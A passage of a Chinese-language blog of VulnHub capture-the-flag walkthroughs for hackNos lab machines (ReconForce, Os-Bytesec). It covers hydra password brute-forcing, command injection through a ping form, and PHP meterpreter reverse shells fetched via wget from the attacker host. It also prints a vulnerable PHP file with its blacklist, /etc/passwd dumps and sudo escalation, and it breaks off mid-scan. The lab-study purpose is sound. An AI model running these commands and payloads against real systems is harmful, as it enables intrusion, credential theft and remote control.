http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tags (CODE:200|SIZE:3554)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;test (CODE:301|SIZE:329)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;themes (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tmp (CODE:301|SIZE:327)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h2><p>WEB服务存在登录页面<br />主页中已经给出了一个联系邮箱:<code>contact@hacknos.com</code><br />可以利用hydra进行口令枚举</p><p>使用top6000弱口令进行枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P FuzzDicts-master&#x2F;passwordDict&#x2F;top6000.txt -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br></pre></td></tr></table></figure><p>未获得账户口令</p><p>使用cewl获取页面内容来作为口令<br /><code>cewl http://192.168.31.39/websec -w pass</code></p><p>使用网站内容作来枚举账户口令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l contact@hacknos.com -P pass -vV -f 192.168.31.39 http-post-form &quot;&#x2F;websec&#x2F;login:username&#x3D;^USER^&amp;password&#x3D;^PASS^:Wrong&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.31.39   login: contact@hacknos.com   password: Securityx</span><br></pre></td></tr></table></figure><p>得到Web账户权限</p><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><p>Web页面中可以在左侧菜单中选择<code>Content &gt; File Manager</code>来管理文件<br />尝试写入Webshell，但是无法访问到文件</p><p>尝试使用msfvenom创建基于php的meterpreter后门，再写入到index.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br><span class="line">cat shell.php</span><br></pre></td></tr></table></figure><p>将内容复制到index.php文件末</p><p>在MSF中接收Meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在Meterpreter的shell中切换至交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">id</span><br><span class="line">   uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>查看/etc/passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">blackdevil:x:1000:118:hackNos:&#x2F;home&#x2F;blackdevil:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>发现文件<code>/var/local/database</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;local&#x2F;database</span><br><span class="line"></span><br><span class="line">Expenses</span><br><span class="line">Software Licenses,$2.78</span><br><span class="line">Maintenance,$68.87</span><br><span class="line">Mortgage Interest,$70.35</span><br><span class="line">Advertising,$9.78</span><br><span class="line">Phone,$406.80</span><br><span class="line">Insurance,$9.04</span><br><span class="line">Opss;fackespreadsheet</span><br></pre></td></tr></table></figure><p>得到提示fackespreadsheet<br />在某个不存在的网站上搜索得到在线解密工具<br /><code>http://www.spammimic.com/spreadsheet.php?action=decode</code><br />解密得<code>Security@x@</code></p><p>尝试以此作为口令登入blackdevil账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh blackdevil@192.168.31.39</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;1000(blackdevil) gid&#x3D;118(docker) groups&#x3D;118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)</span><br></pre></td></tr></table></figure><p>尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">Security@x@</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>hydra在用于爆破Web登录时需要调整的参数有点多</p><ul><li>http请求类型</li><li>数据的参数名</li><li>登录成功/失败时所回应的信息<br />由于登陆失败会回应<code>Wrong email or password</code><br />所以借以该信息来判断是否登入成功</li></ul><p>获取Webshell时有些麻烦，一开始以为是传统的php一句话上传，结果发现上传的文件都不能打开，屡次尝试后转而使用Meterpreter获取Shell</p><p>解密过程的脑洞较大(感觉像是玩CTF的古典密码…)，善用搜索引擎总归是件好事</p><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/weixin_39219503/article/details/103865033">WP</a><br /><a href="https://blog.csdn.net/weixin_43039349/article/details/89323846">hydra</a></p></blockquote><hr /><h1 id="reconforce"><a class="markdownIt-Anchor" href="#reconforce"></a> <a href="https://www.vulnhub.com/entry/hacknos-reconforce-v11,416/">ReconForce</a></h1><p><code>2020/02/02 20:17:42</code></p><h2 id="端口扫描-4"><a class="markdownIt-Anchor" href="#端口扫描-4"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.109</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.109</span><br><span class="line">Host is up (0.00063s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.31.10</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 6f:96:94:65:72:80:08:93:23:90:20:bc:76:df:b8:ec (RSA)</span><br><span class="line">|   256 6f:bb:49:1a:a9:b6:e5:00:84:19:a0:e4:2b:c4:57:c4 (ECDSA)</span><br><span class="line">|_  256 ce:3d:94:05:f4:a6:82:c4:7f:3f:ba:37:1d:f6:23:b0 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title:  Recon_Web</span><br><span class="line">MAC Address: 08:00:27:83:C2:54 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-4"><a class="markdownIt-Anchor" href="#web路径枚举-4"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径<br />未发现有效信息<br />在主页处存在一个链接导向<code>/5ecure/</code>路径<br />存在Basic认证，而且附带一个提示信息<code>Recon Security</code></p><h2 id="漏洞利用-4"><a class="markdownIt-Anchor" href="#漏洞利用-4"></a> 漏洞利用</h2><p>FTP服务允许匿名登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.31.109</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><p>匿名登入之后发现不能进行进一步的操作</p><p>发现Banner为<code>Secure@hackNos</code></p><p>使用cewl生成字典<br /><code>cewl http://192.168.31.109/ &gt;&gt; data</code></p><p>添加一些常用词以及获取到的一些信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;root&quot; &gt;&gt; data</span><br><span class="line">echo &quot;admin&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Recon Security&quot; &gt;&gt; data</span><br><span class="line">echo &quot;Secure@hackNos&quot; &gt;&gt; data</span><br><span class="line">echo &quot;5ecure&quot; &gt;&gt; data</span><br><span class="line">echo &quot;&quot; &gt;&gt; data</span><br></pre></td></tr></table></figure><blockquote><p>Basic认证是基于Get请求进行的，需要附加的一个Head–<code>Authorization</code>，而其内容为<code>Basic xxxxxxxx</code>，其中<code>xxxxxxxx</code>为<code>user:pass</code>进行base64编码之后的结果</p></blockquote><p>使用python脚本转变为相应的格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#test.py</span><br><span class="line">import base64</span><br><span class="line">raw &#x3D; [ </span><br><span class="line">        &#39;Recon&#39;,</span><br><span class="line">        &#39;Web&#39;,</span><br><span class="line">        &#39;Home&#39;,</span><br><span class="line">        &#39;Service&#39;,</span><br><span class="line">        &#39;Blog&#39;,</span><br><span class="line">        &#39;hackNos&#39;,</span><br><span class="line">        &#39;TroubleShoot&#39;,</span><br><span class="line">        &#39;Security&#39;,</span><br><span class="line">        &#39;Recon Security&#39;,</span><br><span class="line">        &#39;Secure&#39;,</span><br><span class="line">        &#39;root&#39;,</span><br><span class="line">        &#39;5ecure&#39;,</span><br><span class="line">        &#39;admin&#39;,</span><br><span class="line">        &#39;Secure@hackNos&#39;,</span><br><span class="line">        &#39;Security@hackNos&#39;,</span><br><span class="line">        &#39;&#39;]</span><br><span class="line">for i in raw:</span><br><span class="line">        for j in raw:</span><br><span class="line">            print base64.b64encode(j + &#39;:&#39; + i)</span><br></pre></td></tr></table></figure><p><code>./test.py &gt; b64.dir</code></p><p>然后在Burp中使用生成的字典进行破解</p><blockquote><p>在爆破的时候遇到了问题，没有爆破出来账户，无奈之下只好在网上看看其他大神的思路，发现貌似作者是想在FTP Banner里写上Security@hackNos但实际写成了Secure@hackNos<br />修改一下脚本里面的raw数组之后发现爆破成功了<br />账户为<code>admin:Security@hackNos</code></p></blockquote><p>进入<code>/5ecure/</code>路径之后发现是一个ping工具，结合一下CTF的内容不难想到这个就是命令注入了，命令执行是在out.php下执行的，而且ping的结果会有回显</p><p><code>&amp; &amp;&amp; | || ;</code> 用这几个符号挨个尝试命令注入</p><p>发现<code>127.0.0.1|ls</code>可以列出当前目录下的文件</p><p><code>127.0.0.1|cat /etc/passwd</code> 也能读取passwd文件</p><p>尝试写入phpinfo<br /><code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.php</code></p><p>但是访问1.php时phpinfo未显示，可能存在过滤<br /><code>127.0.0.1|echo '&lt;?php phpinfo();?&gt;' &gt; 1.txt</code></p><p>1.txt中显示的是<code>&lt;?php phpinfo;?&gt;</code></p><p>看样子是过滤掉了小括号</p><p>查看out.php</p><p><code>127.0.0.1|cat out.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $target &#x3D; trim($_REQUEST[ &#39;ip&#39; ]);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Set blacklist</span><br><span class="line">    $substitutions &#x3D; array(</span><br><span class="line">        &#39;&amp;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;| &#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;-&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;$&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;(&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;)&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;&#96;&#39;  &#x3D;&gt; &#39;&#39;,</span><br><span class="line">        &#39;||&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Remove any of the charactars in the array (blacklist).</span><br><span class="line">    $target &#x3D; str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;</span><br><span class="line">        &#x2F;&#x2F; Windows</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        &#x2F;&#x2F; *nix</span><br><span class="line">        $cmd &#x3D; shell_exec( &#39;ping  -c 4 &#39; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Feedback for the end user</span><br><span class="line">    echo &quot;</span><br><span class="line">&#123;$cmd&#125;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>可以看到过滤掉了一些特殊符号，尝试使用wget命令来下载后门</p><p>使用msfvenom创建基于php的meterpreter后门</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>去掉shell.php中开头的<code>/*</code></p><p>开启python的http服务</p><p><code>python -m SimpleHTTPServer 8000</code></p><p>在网页中执行wget</p><p><code>127.0.0.1|wget http://192.168.31.10:8000/shell.php</code></p><p>在MSF中接收Meterpreter</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>再访问shell.php即可</p><h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2><p>在Meterpreter的shell中获取TTY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在passwd文件中发现可用账户recon<br />一番尝试后发现账户密码同Basic认证的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su recon</span><br><span class="line">Security@hackNos</span><br><span class="line">sudo su</span><br><span class="line">Security@hackNos</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>如何找到靶机的IP?</p></blockquote><p>这个问题曾经让我头疼过一阵子<br />看着网上的WP，有些是使用<code>netdiscover</code>，但是个人倾向于将靶机与Kali的网络配置成桥接模式，即使<code>netdiscover</code>发现了靶机，也没有一个明显地特征可以在当前网段的众多机器中去区分<br />个人的话倒是会去看路由器的后台，然后看看本机上的多个IP<br />而Nmap在扫描靶机时，可以报告其MAC地址与相关厂商，而一般的靶机都会在80端口开放WEB服务，那么就可以扫描80端口，再配合上grep来节选出靶机<br /><code>nmap -p 80 -Pn -v -T5 192.168.31.0/24 | grep -B 6 virtual</code></p><blockquote><p>Web log</p></blockquote><p>在尝试命令执行的时候我也尝试了使用curl命令来进行数据外传，但是发现自己找不到Web服务的log文件，只好用find命令配合grep找，中间也稍微学习了一下grep的正则用法<br /><code>find /* -iname &quot;*.log&quot; | grep -E &quot;(apache|nginx)&quot;</code><br />大概是这个样子</p><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/qq_38526635/article/etails/82147980">FTP</a><br /><a href="https://blog.csdn.net/weixin_44214107/article/details/104056796">WP</a><br /><a href="https://blog.csdn.net/weixin_43754984/article/details/84328313">grep&amp;RE</a></p></blockquote><hr /><h1 id="os-bytesec"><a class="markdownIt-Anchor" href="#os-bytesec"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">Os-Bytesec</a></h1><p><code>2020/02/15 16:50:01</code></p><h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2><p><code>nmap -p- -Pn -sV -n -T5 -v -A 192.168.31.185</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.185</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">80&#x2F;tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">2525&#x2F;tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)</span><br><span class="line">|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)</span><br><span class="line">|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)</span><br><span class="line">MAC Address: 08:00:27:55:0A:C2 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.281 days (since Fri Feb 14 21:05:09 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: 